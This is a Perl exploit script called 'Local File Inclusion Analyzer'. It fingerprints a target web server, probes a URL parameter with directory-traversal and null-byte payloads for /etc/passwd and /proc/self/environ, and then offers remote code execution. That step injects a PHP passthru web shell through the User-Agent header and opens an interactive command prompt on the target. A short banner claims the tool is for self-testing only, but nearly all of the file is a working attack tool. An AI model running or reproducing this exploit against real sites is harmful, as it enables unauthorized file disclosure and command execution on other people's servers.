#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;
use IO::Socket;


#this section checks the platform of OS you are running and clears your terminal for fresh use.
my $os= "$^O";
if ($os eq 'MSWin32'){
system("cls");
}else{
system("clear");
}

print "\n*===============================================*\n";
print "   Local File Inclusion Analyzer\n";
print "   Author: Evans Osoba - c0d3d[at]hotmail.com\n";
print "   Use this program to test yourself only,\n";
print "   Testing on others without their permission is a crime.\n";
print "   Please feel free to improve and reshare this program.\n";
print "   \n";
print "   Your operating system is $os \n";
print "*===============================================*\n\n";

my $socket = IO::Socket::INET;
my $browser = HTTP::Request;
my $ua = LWP::UserAgent;

sub help
{
	print "	[***********************Help*************************]\n\n";
    print "	[!] ./$0 <Host> <Path> Option\n";
	sleep(1);
	print "	[!] ./$0 www.yoursite.com /index.php?page= --test_inject'This Option lets you check if your website is vulnerable to LFI and then attempts to exploit it.'\n";
	sleep(1);
	print "	[!] ./$0 www.yoursite.com /index.php?page= --check 'This Option lets you check if your website is vulnerable to LFI only'\n";
	sleep(1);
    print "	[!] ./$0 www.yoursite.com --help\n\n";
	print "	[***********************Help*************************]\n";
}

my $host = @ARGV[0];
my $path = @ARGV[1];
my $tag  = @ARGV[2];
my $lfi  = "../../../../../../../../../../../../../../../../../../../../../../../../";
my $sub  = "%00";

my @vulns = qw(etc/passwd proc/self/environ);


sub test
{
$socket->new(
             PeerAddr => "$_[0]",
             PeerPort => "80",
             Proto => "tcp"
            ) or die "Cannot Connect To $host on Port 80\n";
			if ($socket) { #Here, we check to see if your host is alive before proceeding.
	#After confirming your host is alive, we gather a few information from the headers.
	my @resp;
	my $linkip;
	my $link = "http://".$_[0];
	my $ua = LWP::UserAgent->new;
	my $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13";
	$ua->agent($agent);
	$ua->timeout(15);
	my $req = HTTP::Request->new(GET => $link);
	$req->content_type('text/html');
	$req->protocol('HTTP/1.0');
	my $response = $ua->request($req);
	if ( $response->is_success ) {
	my $resp = $response->headers()->as_string;
	if($resp =~ /Server: (.+)/){
	my $webserver = $1;
	print "Port 80 is open on $link\n\n";
	print "Web Server: $webserver\n";
	}
	if($resp =~ /Content-Type: (.+)/){
	my $contenttype = $1;
	print "Content-Type: $contenttype\n";
	}
	if($resp =~ /Client-Peer: (.+)/){
	my $linkip = $1;
    $linkip =~ s/:..*//;
	print "Ip Address: $linkip\n";
	push(@resp, $linkip);
	}
	foreach my $ip(@resp){ #Here, we check for the location of HOST.
	my $ua = LWP::UserAgent->new;
	my $contents = $ua->get('http://www.melissadata.com/lookups/iplocation.asp?ipaddress='.$ip);
	my $found = $contents->content;
	if ($found =~ /<tr><td class='columresult'>Country<\/td><td align='left'><b>(.*)<\/b><\/td><\/tr>/) {
	my $iplocation = $1;
	print "Server Location: $iplocation\n\n";
		}
	  }
	}
  }
}

#This section attempts to exploit LFI
sub injectlfi
{
my $llink = $_[0];
my $plink = $llink.$lfi.$vulns[0];
my $plink2 = $llink.$lfi.$vulns[1];
	print "[*] Checking LFI: $llink$vulns[0]\n\n";
	my $re = &query($plink);
	if($re =~ /nobody:x/){
	print "[!] $host is Vulnerable to LFI\n\n";
	}else{
	my $plink = $llink.$lfi.$vulns[0].$sub;
	print "[*] Checking LFI: $llink$vulns[0]$sub\n\n";
	my $re = &query($plink);
	if($re =~ /nobody:x/){
	print "[!] $host is Vulnerable to LFI\n\n";
	}else{
	my $plink2 = $llink.$lfi.$vulns[1];
	print "[*] Checking LFI: $llink$vulns[1]\n\n";
	my $re = &query($plink);
	if($re =~ /HTTP_USER_AGENT/){
	print "[!] $host is Vulnerable to LFI\n\n";
	}else{
	my $plink2 = $llink.$lfi.$vulns[1].$sub;
	print "[*] Checking LFI: $llink$vulns[1]$sub\n\n";
	my $re = &query($plink);
	if($re =~ /HTTP_USER_AGENT/){
	print "[!] $host is Vulnerable to LFI\n\n";
	}
	}
	}
	}
	sleep(1);
	print "Attempt RCE over Target [y/N]: ";
	chomp( $rce = <STDIN> );
    if($rce !~ "N"){
	print "\n	[*] Checking Target For RCE over LFI...\n\n";
	sleep(1);
	&rce($plink2);
	}
}


sub checklfi
{
my $llink = $_[0];
my $plink = $llink.$lfi.$vulns[0];
my $plink2 = $llink.$lfi.$vulns[1];
	print "[*] Checking LFI: $llink$vulns[0]\n\n";
	my $re = &query($plink);
	if($re =~ /nobody:x/){
	print "[!] $host is Vulnerable to LFI\n";
	print "Do ./$0 www.yoursite.com /index.php?page= --test_inject to see if you can be injected.\n\n";
	}else{
	my $plink = $llink.$lfi.$vulns[0].$sub;
	print "[*] Checking LFI: $llink$vulns[0]$sub\n\n";
	my $re = &query($plink);
	if($re =~ /nobody:x/){
	print "[!] $host is Vulnerable to LFI\n\n";
	print "Do ./$0 www.yoursite.com /index.php?page= --test_inject to see if you can be injected.\n\n";
	}else{
	my $plink2 = $llink.$lfi.$vulns[1];
	print "[*] Checking LFI: $llink$vulns[1]\n\n";
	my $re = &query($plink);
	if($re =~ /HTTP_USER_AGENT/){
	print "[!] $host is Vulnerable to LFI\n";
	print "Do ./$0 www.yoursite.com /index.php?page= --test_inject to see if you can be injected.\n\n";
	}else{
	my $plink2 = $llink.$lfi.$vulns[1].$sub;
	print "[*] Checking LFI: $llink$vulns[1]$sub\n\n";
	my $re = &query($plink);
	if($re =~ /HTTP_USER_AGENT/){
	print "[!] $host is Vulnerable to LFI\n";
	print "Do ./$0 www.yoursite.com /index.php?page= --test_inject to see if you can be injected.\n\n";
	}else{
	print "\n	[*] Congratulations: $host is NOT Vulnerable to LFI...\n\n";
	}
	}
	}
  }
}


sub rce
{
my $rclink = $_[0];
my $rce = &query($rclink);
	if($rce =~ /HTTP_USER_AGENT/){
	print "	[*] RCE Path Found, Run a few commands to be sure\n\n";
	&rcmd($rclink);
	}else{
	my $rclink = $rclink.$sub;
	my $rce = &query($rclink);
	if($rce =~ /HTTP_USER_AGENT/){
	print "	[*] RCE Path Found, Run a few commands to be sure\n\n";
	&rcmd($rclink);
	}else{
	print "	[*] RCE Cannot be performed over LFI Vuln on $host\n	Or $host is not vulnerable to LFI\n\n";
	sleep(1);
	print "	[*] Run './$0 $host $path --check' to be sure.\n\n";
	}
  }
}


sub rcmd
{
my $rcclink = $_[0];
my $cmd = "&cmd=";
print "[$host ~]# ";
chomp( $rccmd = <STDIN> );
while($rccmd !~ "exit"){
	my $test = $rcclink.$cmd.$rccmd;
	my $rcetest = &inject($test);
	if($rcetest =~ /mandung(.*)samira/sg){
	my $result = $1;
	print "\n$result\n";
	}
	print "[$host ~]# ";
	chomp( $rccmd = <STDIN> );
  }
}

if (@ARGV < 1)
	{
	&help;
	exit
	}

while ( $line = <@ARGV> ) {
	if ($line =~ m/--help/)
	{ 
	&help;
	exit;
	}
	elsif ($line =~ m/--check/)
	{ 
	&test(@ARGV[0]);
	print "\nNow Testing $host$path For Vulnerability\n\n";
	my $lin = "http://".$host;
	&checklfi($lin.$path);
	}
	elsif ($line =~ m/--test_inject/)
	{ 
	&test(@ARGV[0]);
	print "\nNow Testing $host$path For Vulnerability\n\n";
	my $links = "http://".$host;
	&injectlfi($links.$path);
	}
}


if ($host =~ /^http:/) {
$host =~ s/http:\/\///g;
}


sub query()
{
	my $stt = $_[0];
	my $ua = LWP::UserAgent->new;
	my $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13";
	$ua->agent($agent);
	$ua->timeout(15);
	my $req = HTTP::Request->new(GET => $stt);
	$req->content_type('text/html');
	$req->protocol('HTTP/1.0');
	my $response = $ua->request($req);
	if ($response->is_success) {
	my $resp = $response->content;
	return $resp;
    }
}


sub inject()
{
	my $inject = $_[0];
    $ua = LWP::UserAgent->new;
    $ua->agent("mandung<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);?>samira");
	$ua->timeout(10);
	$req = HTTP::Request->new(GET => $inject);
	$req->content_type('text/html');
	$req->protocol('HTTP/1.0');
    my $response = $ua->request($req);
    if ($response->is_success) {
	my $resp1 = $response->content;
	return $resp1;
	}
}

print "Note: Please consult a professional web admin for a fix if you are vulnerable to LFI.\n";
